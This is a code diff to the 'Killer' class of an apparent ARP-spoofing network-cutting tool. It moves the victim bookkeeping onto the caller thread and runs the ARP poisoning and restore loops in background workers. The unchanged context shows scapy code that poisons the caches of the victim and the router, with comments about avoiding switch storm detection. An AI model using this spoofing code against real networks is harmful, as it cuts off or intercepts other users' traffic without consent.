@@ -77,21 +77,25 @@ class Killer:
                 pass
             self._socket = None
     
-    @threaded
     def kill(self, victim, wait_after=2):
         """
         Spoofing victim.
         Default 2 second delay - ARP cache lasts 30-120s, no need to spam.
         Prevents Windows NDIS throttling.
+
+        Registers ``self.killed`` on the caller thread so UI state (e.g. toggleKill)
+        stays in sync; only the ARP loop runs in a background thread.
         """
         if victim['mac'] in self.killed:
             return
-        
         self.killed[victim['mac']] = victim
+        self._kill_arp_worker(victim, wait_after)
 
+    @threaded
+    def _kill_arp_worker(self, victim, wait_after=2):
         # Send ARP reply (is-at) with proper Ethernet destination to poison caches
         # Unicast to specific MAC, not broadcast - avoids switch storm detection
-        
+
         # Victim: tell victim that router IP is at our MAC
         to_victim = Ether(dst=victim['mac'])/ARP(
             op=2,
@@ -119,14 +123,19 @@ class Killer:
 
         self._stop_forwarder(victim['mac'])
 
-    @threaded
     def unkill(self, victim):
         """
-        Unspoofing victim
+        Unspoofing victim.
+
+        Removes from ``self.killed`` on the caller thread before ARP restore runs
+        in the background, so the UI does not race with _sync_killed_devices().
         """
         if victim['mac'] in self.killed:
             self.killed.pop(victim['mac'])
+        self._unkill_restore_worker(victim)
 
+    @threaded
+    def _unkill_restore_worker(self, victim):
         # Restore Victim and Router with correct mappings
         to_victim = Ether(dst=victim['mac'])/ARP(
             op=2,
